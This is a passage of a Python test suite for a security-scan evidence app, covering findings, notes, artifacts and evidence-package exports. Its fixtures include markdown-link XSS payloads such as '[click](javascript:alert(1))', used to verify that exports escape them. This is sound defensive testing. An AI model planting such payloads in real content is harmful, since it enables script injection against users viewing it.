            json=payload,
            headers={"X-Session-ID": session_id},
        )
        assert link_resp.status_code == 201
        assert duplicate_resp.status_code == 201
        first_link = json.loads(link_resp.data)["link"]
        duplicate_link = json.loads(duplicate_resp.data)["link"]
        assert first_link["id"] == duplicate_link["id"]
        baseline_link_resp = client.post(
            f"/projects/{project['id']}/links",
            json={"entity_type": "run", "entity_id": baseline_run_id, "source": "manual"},
            headers={"X-Session-ID": session_id},
        )
        assert baseline_link_resp.status_code == 201

        links = json.loads(
            client.get(f"/projects/{project['id']}/links", headers={"X-Session-ID": session_id}).data
        )
        assert {item["entity_id"] for item in links["links"]} == {run_id, baseline_run_id}
        assert all("provenance" not in item for item in links["links"])

        label_resp = client.post(
            f"/entities/run/{run_id}/labels",
            json={"label": "baseline"},
            headers={"X-Session-ID": session_id},
        )
        duplicate_label = client.post(
            f"/entities/run/{run_id}/labels",
            json={"label": "baseline"},
            headers={"X-Session-ID": session_id},
        )
        assert label_resp.status_code == 201
        assert duplicate_label.status_code == 201
        label = json.loads(label_resp.data)["label"]
        assert json.loads(duplicate_label.data)["label"]["id"] == label["id"]
        labels = json.loads(client.get(
            f"/entities/run/{run_id}/labels",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["label"] for item in labels["labels"]] == ["baseline"]

        note_resp = client.put(
            f"/entities/run/{run_id}/note",
            json={"body": "Confirm service owner"},
            headers={"X-Session-ID": session_id},
        )
        assert note_resp.status_code == 200
        note = json.loads(note_resp.data)["note"]
        assert note["body"] == "Confirm service owner"
        assert note["entity_id"] == run_id
        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": True}):
            artifact_path = resolve_workspace_path(session_id, "reports/run.txt", shell_app.CFG, ensure_parent=True)
            artifact_bytes = b"0123456789"
            artifact_path.write_bytes(artifact_bytes)
            artifact_hash = hashlib.sha256(artifact_bytes).hexdigest()
        updated_note = json.loads(client.put(
            f"/entities/run/{run_id}/note",
            json={"body": "Confirmed service owner"},
            headers={"X-Session-ID": session_id},
        ).data)["note"]
        assert updated_note["id"] == note["id"]
        assert updated_note["body"] == "Confirmed service owner"
        note_payload = json.loads(client.get(
            f"/entities/run/{run_id}/note",
            headers={"X-Session-ID": session_id},
        ).data)
        assert note_payload["note"]["id"] == note["id"]

        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, "
                "detected_by, content_sha256, created) "
                "VALUES (?, ?, ?, 'reports/run.txt', 'run.txt', 'output', 10, "
                "'workspace_flag', ?, datetime('now'))",
                (f"rfa_{run_id}", session_id, run_id, artifact_hash),
            )
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'run_file_artifact', ?, 'evidence', datetime('now'))",
                (f"lbl_rfa_{run_id}", session_id, f"rfa_{run_id}"),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'run_file_artifact', ?, 'Raw output reviewed', "
                "datetime('now'), datetime('now'))",
                (f"note_rfa_{run_id}", session_id, f"rfa_{run_id}"),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, severity, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'high', '[click](javascript:alert(1))', "
                "'443/tcp open https', 0, ?, datetime('now'))",
                (f"fnd_{run_id}", session_id, run_id, f"fp-{run_id}"),
            )
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'finding', ?, 'important', datetime('now'))",
                (f"lbl_fnd_{run_id}", session_id, f"fnd_{run_id}"),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'finding', ?, 'needs [retest](javascript:alert(2))', "
                "datetime('now'), datetime('now'))",
                (f"note_fnd_{run_id}", session_id, f"fnd_{run_id}"),
            )
            conn.execute(
                "INSERT INTO run_file_artifacts "
                "(id, session_id, run_id, workspace_path, display_name, kind, byte_size, detected_by, created) "
                "VALUES (?, ?, ?, 'reports/old.txt', 'old.txt', 'output', 8, 'workspace_flag', datetime('now'))",
                (f"rfa_{baseline_run_id}", session_id, baseline_run_id),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'open port 80', '80/tcp open http', 0, ?, datetime('now'))",
                (f"fnd_{baseline_run_id}", session_id, baseline_run_id, f"fp-{baseline_run_id}"),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'direct run finding', '8080/tcp open http-proxy', 1, ?, datetime('now'))",
                (f"fnd_direct_{run_id}", session_id, run_id, f"fp-direct-{run_id}"),
            )
            conn.execute(
                "INSERT INTO findings "
                "(id, session_id, run_id, scope, title, raw_line, line_number, fingerprint, created) "
                "VALUES (?, ?, ?, 'finding', 'outside project finding', 'outside project', 0, ?, datetime('now'))",
                (f"fnd_{outside_run_id}", session_id, outside_run_id, f"fp-{outside_run_id}"),
            )
            conn.execute(
                "DELETE FROM findings_occurrences WHERE finding_id = ?",
                (f"fnd_direct_{run_id}",),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'finding', ?, 'direct run fallback', datetime('now'), datetime('now'))",
                (f"note_fnd_direct_{run_id}", session_id, f"fnd_direct_{run_id}"),
            )
            conn.commit()
        with mock.patch.dict(shell_app.CFG, {"workspace_enabled": True}):
            summary = json.loads(client.get(
                f"/projects/{project['id']}/summary",
                headers={"X-Session-ID": session_id},
            ).data)
            artifacts_page = json.loads(client.get(
                f"/projects/{project['id']}/artifacts?limit=1&offset=0",
                headers={"X-Session-ID": session_id},
            ).data)
            assert artifacts_page["total"] == 2
            assert artifacts_page["limit"] == 1
            assert len(artifacts_page["artifacts"]) == 1
            all_artifacts = json.loads(client.get(
                f"/projects/{project['id']}/artifacts?limit=10&offset=0",
                headers={"X-Session-ID": session_id},
            ).data)
            searched_artifacts = json.loads(client.get(
                f"/projects/{project['id']}/artifacts?limit=10&offset=0&q=run",
                headers={"X-Session-ID": session_id},
            ).data)
            artifact_statuses = {item["workspace_path"]: item for item in all_artifacts["artifacts"]}
            assert artifact_statuses["reports/run.txt"]["file_status"] == "available"
            assert artifact_statuses["reports/run.txt"]["file_available"] is True
            assert artifact_statuses["reports/run.txt"]["current_byte_size"] == 10
            assert artifact_statuses["reports/run.txt"]["content_sha256"] == artifact_hash
            assert artifact_statuses["reports/run.txt"]["labels"][0]["label"] == "evidence"
            assert artifact_statuses["reports/run.txt"]["note"]["body"] == "Raw output reviewed"
            assert artifact_statuses["reports/old.txt"]["file_status"] == "missing"
            assert artifact_statuses["reports/old.txt"]["file_available"] is False
            assert artifact_statuses["reports/old.txt"]["current_byte_size"] is None
            assert searched_artifacts["total"] == 1
            assert [item["workspace_path"] for item in searched_artifacts["artifacts"]] == ["reports/run.txt"]
            preview_resp = client.get(
                f"/projects/{project['id']}/artifacts/rfa_{run_id}/preview",
                headers={"X-Session-ID": session_id},
            )
            assert preview_resp.status_code == 200
            preview_payload = json.loads(preview_resp.data)
            assert preview_payload["artifact"]["workspace_path"] == "reports/run.txt"
            assert preview_payload["text"] == "0123456789"
            download_resp = client.get(
                f"/projects/{project['id']}/artifacts/rfa_{run_id}/download",
                headers={"X-Session-ID": session_id},
            )
            assert download_resp.status_code == 200
            assert download_resp.data == b"0123456789"
            assert download_resp.headers["Content-Length"] == "10"
            assert "attachment" in download_resp.headers["Content-Disposition"]
            ticket_resp = client.post(
                f"/projects/{project['id']}/artifacts/rfa_{run_id}/download-ticket",
                headers={"X-Session-ID": session_id},
            )
            assert ticket_resp.status_code == 200
            ticket_download = client.get(ticket_resp.get_json()["url"])
            assert ticket_download.status_code == 200
            assert ticket_download.data == b"0123456789"
            assert ticket_download.headers["Content-Length"] == "10"
            missing_preview = client.get(
                f"/projects/{project['id']}/artifacts/rfa_{baseline_run_id}/preview",
                headers={"X-Session-ID": session_id},
            )
            assert missing_preview.status_code == 404
            artifact_path.write_bytes(b"abcdefghij")
            changed_artifacts = json.loads(client.get(
                f"/projects/{project['id']}/artifacts?limit=10&offset=0",
                headers={"X-Session-ID": session_id},
            ).data)
            changed_artifact = {
                item["workspace_path"]: item for item in changed_artifacts["artifacts"]
            }["reports/run.txt"]
            assert changed_artifact["file_status"] == "changed"
            assert "checksum differs" in changed_artifact["file_status_detail"]
        assert summary["project"]["id"] == project["id"]
        assert summary["counts"] == {
            "runs": 2,
            "entities": 0,
            "targets": 0,
            "pending_targets": 0,
            "artifacts": 2,
            "findings": 3,
            "labels": 3,
            "notes": 5,
            "packages": 0,
        }
        assert summary["finding_summary"] == {
            "review_states": {"new": 3},
            "severities": {"high": 1, "info": 2},
        }
        counted_list = json.loads(client.get(
            "/projects?include_archived=1&include_counts=1&limit=10&offset=0",
            headers={"X-Session-ID": session_id},
        ).data)
        counted_project = next(item for item in counted_list["projects"] if item["id"] == project["id"])
        assert counted_project["finding_summary"] == summary["finding_summary"]
        assert summary["artifacts"] == []
        assert summary["entities"] == []
        assert summary["entity_counts"] == {}
        assert {item["id"] for item in summary["runs"]} == {run_id, baseline_run_id}
        run_summaries = {item["id"]: item for item in summary["runs"]}
        assert run_summaries[run_id]["labels"][0]["label"] == "baseline"
        assert run_summaries[run_id]["note"]["body"] == "Confirmed service owner"
        assert run_summaries[run_id]["finding_count"] == 2
        assert run_summaries[run_id]["artifact_count"] == 1
        assert run_summaries[baseline_run_id]["finding_count"] == 1
        assert run_summaries[baseline_run_id]["artifact_count"] == 1
        paged_runs = json.loads(client.get(
            f"/projects/{project['id']}/runs?limit=1&offset=0",
            headers={"X-Session-ID": session_id},
        ).data)
        assert paged_runs["total"] == 2
        assert paged_runs["limit"] == 1
        assert paged_runs["offset"] == 0
        assert len(paged_runs["runs"]) == 1
        assert {"finding_count", "artifact_count"}.issubset(paged_runs["runs"][0])
        project_findings = json.loads(client.get(
            f"/projects/{project['id']}/findings?review_state=new&command_root=nmap&run_id={run_id}"
            "&label=important&note_state=noted&severity=high&scope=finding",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["run_id"] for item in project_findings["findings"]] == [run_id]
        assert project_findings["findings"][0]["command_root"] == "nmap"
        bulk_review_resp = client.post(
            f"/projects/{project['id']}/findings/review",
            json={
                "finding_ids": [f"fnd_{run_id}", f"fnd_{outside_run_id}", "missing-finding"],
                "review_state": "important",
            },
            headers={"X-Session-ID": session_id},
        )
        assert bulk_review_resp.status_code == 200
        assert json.loads(bulk_review_resp.data)["counts"] == {"updated": 1, "not_found": 2}
        audit_rows = _audit_event_rows(target_id=f"fnd_{run_id}", event_type="finding.review_change")
        assert len(audit_rows) == 1
        assert audit_rows[0]["project_id"] == project["id"]
        assert audit_rows[0]["details"]["finding_ids"] == [f"fnd_{run_id}"]
        activity_resp = client.get(
            f"/projects/{project['id']}/activity?event_type=finding.review_change"
            f"&target_type=finding&target_id=fnd_{run_id}",
            headers={"X-Session-ID": session_id},
        )
        assert activity_resp.status_code == 200
        assert [event["target"]["id"] for event in activity_resp.get_json()["events"]] == [f"fnd_{run_id}"]
        with sqlite3.connect(DB_PATH) as conn:
            review_rows = {
                row[0]: row[1]
                for row in conn.execute(
                    "SELECT id, status FROM findings WHERE id IN (?, ?)",
                    (f"fnd_{run_id}", f"fnd_{outside_run_id}"),
                ).fetchall()
            }
        assert review_rows[f"fnd_{run_id}"] == "important"
        assert review_rows[f"fnd_{outside_run_id}"] == "new"
        multi_value_findings = json.loads(client.get(
            f"/projects/{project['id']}/findings?run_id={run_id}&run_id={baseline_run_id}"
            f"&review_state=new&review_state=reviewed&review_state=important&label=important&label=missing",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["run_id"] for item in multi_value_findings["findings"]] == [run_id]
        unnoted_findings = json.loads(client.get(
            f"/projects/{project['id']}/findings?note_state=unnoted",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["run_id"] for item in unnoted_findings["findings"]] == [baseline_run_id]
        paged_findings = json.loads(client.get(
            f"/projects/{project['id']}/findings?limit=1&offset=1",
            headers={"X-Session-ID": session_id},
        ).data)
        assert paged_findings["total"] == 3
        assert paged_findings["limit"] == 1
        assert paged_findings["offset"] == 1
        assert len(paged_findings["findings"]) == 1
        assert paged_findings["has_more"] is True
        assert paged_findings["group_counts"] == {"nmap darklab.sh": 3}
        comparison = json.loads(client.get(
            self._project_compare_url(project["id"], left=run_id, right=baseline_run_id),
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["raw_line"] for item in comparison["objects"]["findings"]["added"]] == ["80/tcp open http"]
        assert [item["raw_line"] for item in comparison["objects"]["findings"]["removed"]] == ["443/tcp open https"]
        assert [item["workspace_path"] for item in comparison["objects"]["artifacts"]["added"]] == ["reports/old.txt"]
        assert [item["workspace_path"] for item in comparison["objects"]["artifacts"]["removed"]] == ["reports/run.txt"]
        baseline_label = client.post(
            f"/entities/run/{baseline_run_id}/labels",
            json={"label": "baseline"},
            headers={"X-Session-ID": session_id},
        )
        assert baseline_label.status_code == 201
        baseline_comparison = json.loads(client.get(
            self._project_compare_url(project["id"], left=run_id, baseline_label="baseline"),
            headers={"X-Session-ID": session_id},
        ).data)
        assert baseline_comparison["right_run_id"] == baseline_run_id
        assert baseline_comparison["baseline_label"] == "baseline"
        invalid_project_findings = client.get(
            f"/projects/{project['id']}/findings?review_state=maybe",
            headers={"X-Session-ID": session_id},
        )
        assert invalid_project_findings.status_code == 400
        evidence_target = json.loads(client.post(
            f"/projects/{project['id']}/targets",
            json={"type": "domain", "value": "darklab.sh", "source_run_id": run_id},
            headers={"X-Session-ID": session_id},
        ).data)["target"]
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "INSERT INTO entity_labels "
                "(id, session_id, entity_type, entity_id, label, created) "
                "VALUES (?, ?, 'target', ?, 'production', datetime('now'))",
                (f"lbl_tgt_{run_id}", session_id, evidence_target["id"]),
            )
            conn.execute(
                "INSERT INTO entity_notes "
                "(id, session_id, entity_type, entity_id, body, created, updated) "
                "VALUES (?, ?, 'target', ?, 'Primary external target', datetime('now'), datetime('now'))",
                (f"note_tgt_{run_id}", session_id, evidence_target["id"]),
            )
            conn.commit()
        with sqlite3.connect(DB_PATH) as conn:
            conn.execute(
                "UPDATE findings SET target_id = ? WHERE id = ?",
                (evidence_target["id"], f"fnd_{run_id}"),
            )
            conn.commit()
        triage_resp = client.put(
            f"/findings/fnd_{run_id}/triage",
            json={
                "remediation": "Patch TLS config for darklab.sh.",
                "verification_steps": "Re-run nmap -sV darklab.sh.",
                "verification_status": "ready_to_verify",
                "verification_notes": "Internal ticket APP-123.",
            },
            headers={"X-Session-ID": session_id},
        )
        assert triage_resp.status_code == 200
        triage_payload = triage_resp.get_json()
        assert isinstance(triage_payload, dict)

        package_resp = client.post(
            f"/projects/{project['id']}/packages",
            json={
                "name": "Draft Evidence",
                "description": "Initial package manifest",
                "redaction_mode": "raw",
                "include_artifacts": True,
                "preset": "custom",
                "include_private_notes": True,
                "labels": ["handoff"],
                "notes": "Package review note",
                "selection": {
                    "run_ids": [run_id],
                    "finding_ids": [f"fnd_{run_id}"],
                    "artifact_ids": [f"rfa_{run_id}", f"rfa_{baseline_run_id}"],
                    "target_ids": [evidence_target["id"]],
                },
            },
            headers={"X-Session-ID": session_id},
        )
        assert package_resp.status_code == 201
        package = json.loads(package_resp.data)["package"]
        assert package["project_id"] == project["id"]
        assert package["include_artifacts"] is True
        assert package["redaction_mode"] == "raw"
        assert [item["label"] for item in package["labels"]] == ["handoff"]
        assert package["note"]["body"] == "Package review note"
        assert package["manifest"]["package_format_version"] == 2
        assert package["manifest"]["format"] == 2
        assert package["manifest"]["counts"]["runs"] == 1
        assert package["manifest"]["counts"]["findings"] == 1
        assert package["manifest"]["counts"]["artifacts"] == 2
        assert package["manifest"]["counts"]["targets"] == 1
        assert package["manifest"]["project_counts"]["runs"] == 2
        assert package["manifest"]["selected_entity_ids"]["run_ids"] == [run_id]
        assert package["manifest"]["selected_entity_ids"]["finding_ids"] == [f"fnd_{run_id}"]
        assert package["manifest"]["selected_entity_ids"]["artifact_ids"] == [
            f"rfa_{run_id}",
            f"rfa_{baseline_run_id}",
        ]
        assert package["manifest"]["selected_entity_ids"]["target_ids"] == [evidence_target["id"]]
        assert package["manifest"]["include_private_notes"] is True
        assert package["manifest"]["redaction_mode"] == "raw"
        assert package["manifest"]["options"]["index_html"] is True
        assert package["manifest"]["options"]["transcripts_html"] is True
        assert package["manifest"]["selected_entity_ids"]["transcript_run_ids"] == [run_id]
        assert package["manifest"]["estimated_archive"]["estimated_uncompressed_bytes"] > 0
        assert package["manifest"]["estimated_archive"]["raw_artifact_bytes"] == 0
        assert package["manifest"]["estimated_archive"]["skipped_artifact_count_estimate"] == 2
        assert package["manifest"]["estimated_archive"]["selected_transcript_count"] == 1
        assert package["manifest"]["provenance"]["schema_version"] == 1
        assert package["manifest"]["provenance"]["kind"] == "evidence_package"
        assert package["manifest"]["provenance"]["build"]["selected_entity_ids"]["run_ids"] == [run_id]
        assert package["manifest"]["provenance"]["build"]["selected_entity_counts"]["artifact_ids"] == 2
        assert package["manifest"]["provenance"]["sources"]["project_links"] == {
            "origin_sources": ["manual"],
            "counts_by_origin": {"manual": 2},
        }
        assert package["manifest"]["provenance"]["privacy"] == {
            "redaction_mode": "raw",
            "private_notes_included": True,
        }
        assert package["manifest"]["runs"][0]["provenance"]["origin"] == "manual"
        assert package["manifest"]["runs"][0]["provenance"]["confidence"] == 1.0
        assert package["manifest"]["targets"][0]["provenance"]["origin"] == "manual"
        assert package["manifest"]["targets"][0]["provenance"]["source_detail"] == {}
        target_reference = package["manifest"]["findings"][0]["target_references"][0]
        assert target_reference["target_id"] == evidence_target["id"]
        assert target_reference["type"] == "domain"
        assert target_reference["value"] == "darklab.sh"
        assert target_reference["source_run_id"] == run_id
        assert target_reference["relationship_source"] == "manual"
        assert target_reference["confidence"] == 1.0
        import_hints = package["manifest"]["import_hints"]
        assert import_hints["kind"] == "evidence_package_import_hints"
        assert import_hints["mode"] == "preview_only"
        assert import_hints["selected_entity_ids"]["run_ids"] == [run_id]
        assert import_hints["package_metadata"]["archive_paths"]["labels"] == "metadata/labels.json"
        assert import_hints["package_metadata"]["archive_paths"]["notes"] == "notes/entity-notes.json"
        assert import_hints["source_links"] == [
            {
                "entity_type": "run",
                "entity_id": run_id,
                "source": "manual",
                "confidence": 1.0,
                "review_state": "confirmed",
            },
            {
                "entity_type": "atlas_entity",
                "entity_id": evidence_target["id"],
                "source": "manual",
                "confidence": 1.0,
                "review_state": "confirmed",
            },
        ]
        assert import_hints["target_relationships"][0]["finding_id"] == f"fnd_{run_id}"
        assert import_hints["target_relationships"][0]["target_id"] == evidence_target["id"]
        assert import_hints["finding_review_state"][0]["review_state"] == "important"
        import_hint_warnings = {
            (warning["code"], warning.get("entity_id")): warning
            for warning in import_hints["warnings"]
        }
        assert import_hint_warnings[("artifact_not_available", f"rfa_{run_id}")]["status"] == "changed"
        assert import_hint_warnings[("artifact_not_available", f"rfa_{baseline_run_id}")]["status"] == "missing"
        package_label_resp = client.post(
            f"/entities/package/{package['id']}/labels",
            json={"label": "handoff"},
            headers={"X-Session-ID": session_id},
        )
        package_note_resp = client.put(
            f"/entities/package/{package['id']}/note",
            json={"body": "Package review note"},
            headers={"X-Session-ID": session_id},
        )
        assert package_label_resp.status_code == 201
        assert package_note_resp.status_code == 200

        packages = json.loads(client.get(
            f"/projects/{project['id']}/packages",
            headers={"X-Session-ID": session_id},
        ).data)
        assert [item["id"] for item in packages["packages"]] == [package["id"]]
        assert [item["label"] for item in packages["packages"][0]["labels"]] == ["handoff"]
        assert packages["packages"][0]["note"]["body"] == "Package review note"
        package_get = json.loads(client.get(
            f"/projects/{project['id']}/packages/{package['id']}",
            headers={"X-Session-ID": session_id},
        ).data)
        assert package_get["package"]["name"] == "Draft Evidence"
        assert [item["label"] for item in package_get["package"]["labels"]] == ["handoff"]
        assert package_get["package"]["note"]["body"] == "Package review note"
        with (
            mock.patch.dict(shell_app.CFG, {"workspace_enabled": True, "max_output_lines": 2}),
            mock.patch.object(project_routes.log, "info") as package_log,
        ):
            package_download = client.get(
                f"/projects/{project['id']}/packages/{package['id']}/download",
                headers={"X-Session-ID": session_id},
            )
        assert package_download.status_code == 200
        assert "attachment" in package_download.headers["Content-Disposition"]
        download_log = next(
            call for call in package_log.call_args_list
            if call.args and call.args[0] == "EVIDENCE_PACKAGE_DOWNLOADED"
        )
        download_log_extra = download_log.kwargs["extra"]
        assert download_log_extra["duration_ms"] >= 0
        assert download_log_extra["archive_bytes"] == len(package_download.data)
        assert download_log_extra["projected_bytes"] > 0
        assert download_log_extra["selected_runs"] == 1
        assert download_log_extra["selected_findings"] == 1
        assert download_log_extra["selected_artifacts"] == 2
        assert download_log_extra["selected_targets"] == 1
        assert download_log_extra["selected_transcripts"] == 1
        assert download_log_extra["skipped_artifacts"] == 2
        assert download_log_extra["skipped_items"] == 3
        for metric_name in (
            "metadata_ms",
            "core_entries_ms",
            "artifacts_ms",
            "run_pages_ms",
            "manifest_ms",
            "findings_ms",
            "targets_ms",
            "notes_ms",
            "index_ms",
            "readme_ms",
            "zip_finalize_ms",
        ):
            assert download_log_extra[metric_name] >= 0
        with zipfile.ZipFile(io.BytesIO(package_download.data)) as archive:
            names = set(archive.namelist())
            assert "manifest.json" in names
            assert "assets/package.css" in names
            assert "index.html" in names
            assert "README.md" in names
            assert "findings/findings.json" in names
            assert "findings/findings.md" in names
            assert "targets/targets.json" in names
            assert "targets/targets.md" in names
            assert "metadata/labels.json" in names
            assert "notes/entity-notes.json" in names
            assert "notes/entity-notes.md" in names
            assert "notes/project.md" in names
            assert f"runs/{run_id}.html" in names
            assert f"runs/{run_id}.txt" in names
            assert f"runs/{baseline_run_id}.html" not in names
            assert "artifacts/reports/run.txt" not in names
            assert "artifacts/reports/old.txt" not in names
            assert "skipped-artifacts.json" in names
            assert "skipped-items.json" in names
            downloaded_manifest = json.loads(archive.read("manifest.json"))
            findings_json = json.loads(archive.read("findings/findings.json"))
            findings_md = archive.read("findings/findings.md").decode("utf-8")
            targets_json = json.loads(archive.read("targets/targets.json"))
            targets_md = archive.read("targets/targets.md").decode("utf-8")
            labels_json = json.loads(archive.read("metadata/labels.json"))
            notes_json = json.loads(archive.read("notes/entity-notes.json"))
            notes_md = archive.read("notes/entity-notes.md").decode("utf-8")
            project_notes_md = archive.read("notes/project.md").decode("utf-8")
            index_html = archive.read("index.html").decode("utf-8")
            readme = archive.read("README.md").decode("utf-8")
            run_html = archive.read(f"runs/{run_id}.html").decode("utf-8")
            run_text = archive.read(f"runs/{run_id}.txt").decode("utf-8")
            skipped_items = json.loads(archive.read("skipped-items.json"))
            package_archive_text = "\n".join(
                archive.read(name).decode("utf-8")
                for name in sorted(names)
                if name.endswith((".css", ".html", ".json", ".md", ".txt"))
            )
        assert downloaded_manifest["package"]["id"] == package["id"]
        assert downloaded_manifest["format"] == 2
        assert downloaded_manifest["provenance"]["schema_version"] == 1
        assert "audit" not in downloaded_manifest["provenance"]
        assert "audit" not in downloaded_manifest["manifest"]["provenance"]
        _assert_no_audit_private_export_strings(package_archive_text)
        assert downloaded_manifest["manifest"]["counts"]["runs"] == 1
        assert downloaded_manifest["manifest"]["counts"]["artifacts"] == 2
        assert downloaded_manifest["manifest"]["import_hints"]["target_relationships"][0]["target_id"] == (
            evidence_target["id"]
        )
        assert downloaded_manifest["transcripts"][0]["run_id"] == run_id
        assert downloaded_manifest["transcripts"][0]["archive_path"] == f"runs/{run_id}.html"
        assert downloaded_manifest["transcripts"][0]["lines"][0]["line_index"] == 0
        assert downloaded_manifest["transcripts"][0]["lines"][0]["signals"] == ["findings"]
        assert downloaded_manifest["transcripts"][0]["lines"][0]["entities"][0]["canonical_value"] == "darklab.sh"
        assert "0.10-kpps" not in json.dumps(downloaded_manifest["transcripts"][0]["lines"])
        assert findings_json["count"] == 1
        assert findings_json["findings"][0]["raw_line"] == "443/tcp open https"
        assert findings_json["findings"][0]["run_page"] == f"runs/{run_id}.html#L1"
        assert findings_json["findings"][0]["target_references"][0]["value"] == "darklab.sh"
        assert findings_json["findings"][0]["target_references"][0]["source_run_id"] == run_id
        assert findings_json["findings"][0]["triage"] == {
            "id": triage_payload["triage"]["id"],
            "session_id": session_id,
            "team_id": "",
            "finding_id": f"fnd_{run_id}",
            "remediation": "Patch TLS config for darklab.sh.",
            "verification_steps": "Re-run nmap -sV darklab.sh.",
            "verification_status": "ready_to_verify",
            "verification_notes": "Internal ticket APP-123.",
            "created": triage_payload["triage"]["created"],
            "updated": triage_payload["triage"]["updated"],
        }
        assert downloaded_manifest["manifest"]["findings"][0]["triage"]["remediation"] == (
            "Patch TLS config for darklab.sh."
        )
        assert "# Findings" in findings_md
        assert "443/tcp open https" in findings_md
        assert "domain: darklab.sh" in findings_md
        assert "manual, run " in findings_md
        assert "Remediation: Patch TLS config for darklab.sh." in findings_md
        assert "Verification steps: Re-run nmap -sV darklab.sh." in findings_md
        assert "Verification notes: Internal ticket APP-123." in findings_md
        assert "[click](javascript:alert(1))" not in findings_md
        assert r"\[click\]\(javascript:alert\(1\)\)" in findings_md
        assert "[retest](javascript:alert(2))" not in findings_md
        assert r"\[retest\]\(javascript:alert\(2\)\)" in findings_md
        assert targets_json["count"] == 1
        assert targets_json["targets"][0]["value"] == "darklab.sh"
        assert targets_json["targets"][0]["finding_ids"] == [f"fnd_{run_id}"]
        assert targets_json["targets"][0]["run_ids"] == [run_id]
        assert targets_json["targets"][0]["labels"][0]["label"] == "production"
        assert targets_json["targets"][0]["note"]["body"] == "Primary external target"
        assert "# Targets" in targets_md
        assert "darklab.sh" in targets_md
        assert "Primary external target" in targets_md
        assert "Related Findings" in targets_md
        assert "domain: darklab.sh" in index_html
        assert "[click](javascript:alert(1))" not in targets_md
        assert r"\[click\]\(javascript:alert\(1\)\)" in targets_md
        assert labels_json["count"] == 5
        assert {item["label"] for item in labels_json["labels"]} == {
            "baseline",
            "evidence",
            "handoff",
            "important",
            "production",
        }
        assert notes_json["include_private_notes"] is True
        assert notes_json["count"] == 6
        assert {item["body"] for item in notes_json["notes"]} == {
            "Confirmed service owner",
            "Package review note",
            "Package notes for the external handoff.",
            "Primary external target",
            "Raw output reviewed",
            "needs [retest](javascript:alert(2))",
        }
        assert downloaded_manifest["package"]["labels"][0]["label"] == "handoff"
        assert downloaded_manifest["package"]["note"]["body"] == "Package review note"
        assert "# Entity Notes" in notes_md
        assert "[retest](javascript:alert(2))" not in notes_md
        assert r"\[retest\]\(javascript:alert\(2\)\)" in notes_md
        assert "# External Review Notes" in project_notes_md
        assert "Package notes for the external handoff." in project_notes_md
        assert findings_json["findings"][0]["labels"][0]["label"] == "important"
        assert findings_json["findings"][0]["note"]["body"] == "needs [retest](javascript:alert(2))"
        assert "Draft Evidence" in index_html
        assert "Package notes for the external handoff." in index_html
        assert "443/tcp open https" in index_html
        assert 'data-sort-table="findings"' in index_html
        assert "important" in index_html
        assert "needs [retest](javascript:alert(2))" in index_html
        assert "run.txt" in index_html
        assert "Package Exports" in index_html
        assert "findings/findings.json" in index_html
        assert "targets/targets.json" in index_html
        assert "targets/targets.md" in index_html
        assert "metadata/labels.json" in index_html
        assert "notes/entity-notes.md" in index_html
        assert "notes/project.md" in index_html
        assert "Skipped Items" in index_html
        assert "reports/old.txt" in index_html
        assert "# Draft Evidence" in readme
        assert "## Project Notes" in readme
        assert "Package notes for the external handoff." in readme
        assert "Labels: `important`" in readme
        assert "Remediation: Patch TLS config for darklab.sh." in readme
        assert "Verification steps: Re-run nmap -sV darklab.sh." in readme
        assert "Verification notes: Internal ticket APP-123." in readme
        assert "[click](javascript:alert(1))" not in readme
        assert r"\[click\]\(javascript:alert\(1\)\)" in readme
        assert "[retest](javascript:alert(2))" not in readme
        assert r"\[retest\]\(javascript:alert\(2\)\)" in readme
        assert "## Package Exports" in readme
        assert "notes/entity-notes.json" in readme
        assert "targets/targets.md" in readme
        assert "notes/entity-notes.md" in readme
        assert "notes/project.md" in readme
        assert f"runs/{run_id}.txt" in readme
        assert "## Skipped Items" in readme
        assert "reports/old.txt" in readme
        assert "nmap darklab.sh" in run_html
        assert "443/tcp open https" in run_html
        assert "0.10-kpps" in run_html
        assert "Download full text transcript" in run_html
        assert "scan completed" in run_text
        assert skipped_items["items"][0]["kind"] == "artifact"
        assert {item["kind"] for item in skipped_items["items"]} == {"artifact", "transcript"}
        assert any(item.get("workspace_path") == "reports/old.txt" for item in skipped_items["items"])
        assert any(
            item.get("workspace_path") == "reports/run.txt"
            and "checksum differs" in item.get("reason", "")
            for item in skipped_items["items"]
        )
        summary_after_package = json.loads(client.get(
            f"/projects/{project['id']}/summary",
            headers={"X-Session-ID": session_id},
        ).data)
        assert summary_after_package["counts"]["packages"] == 1
        assert summary_after_package["counts"]["labels"] == 6
        assert summary_after_package["counts"]["notes"] == 7
        assert [item["id"] for item in summary_after_package["packages"]] == [package["id"]]

        hidden_label = client.get(f"/entities/run/{run_id}/labels", headers={"X-Session-ID": "other-session"})
        assert hidden_label.status_code == 404

        delete_note = client.delete(
            f"/entities/run/{run_id}/note",
            headers={"X-Session-ID": session_id},
        )
        assert delete_note.status_code == 200
        delete_label = client.delete(
            f"/entities/run/{run_id}/labels",
            json={"label": "baseline"},
